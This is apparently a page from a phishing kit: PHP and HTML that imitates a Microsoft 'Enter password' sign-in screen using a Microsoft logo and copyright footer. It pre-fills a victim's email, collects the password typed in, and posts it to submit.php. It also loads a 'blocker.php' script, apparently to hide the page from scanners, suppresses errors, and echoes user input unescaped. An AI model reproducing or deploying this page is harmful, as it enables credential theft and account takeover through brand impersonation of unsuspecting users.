<?php
require "includes/enc.php";
error_reporting(0);


	include('blocker.php');
        
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = $_POST['email'];	
	} else if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];
	} else {
		header('Location: index.php?error=1');
	}
	
	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "Make sure that you type the password for your email account.";
		}
	}

?>

<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>	
	
</head>

<body style="background-image:url(images/1.jpg)"
    
<div class="overlay">
		<div class="login-box" style="width:500px;padding:40px;">
			<img src="images/ms-logo-v2.jpg" alt="logo">

		<div id="identity-name" class="identity" style="text-align:left;padding-top:20px;">
					<?php echo $email; ?>
				</div></p>

			

			<h2 id="title" style="font-family:Arial;font-weight:bold;">Enter password</h2>
			<p id="message" class="message"><?php echo $errorMsg; ?></p>

			<div id="loader" class="loader hidden">
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
			</div>

			<form action="submit.php" method="post">
				<input type="hidden" id="email" name="email" value="<?php echo $email; ?>">
				<input id="password" type="password" name="password" placeholder="Password" required autofocus  style="border:1px #0067b8;border-style: hidden hidden solid hidden;padding:0px;width:100%;>
				<br />
				<div id="group2">
				<div id="keepme"><span>Keep me signed in</span> <input name="keepme" type="checkbox"/></div>
				<br>
				<small id="fps"><a href="#" class="fade">Forgot my password</a></small>
		
				<br>
				
				<p align="right"><button id="next" class="next" style="width:120px;height:30px;">Sign in</button></p>
			</form>
			</div>
		</div>
	</div>

	<footer>
		<ul>
			<li><a>...</a></li>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>&copy;2018 Microsoft</a></li>
		
		</ul>
	</footer>

</body>
</html>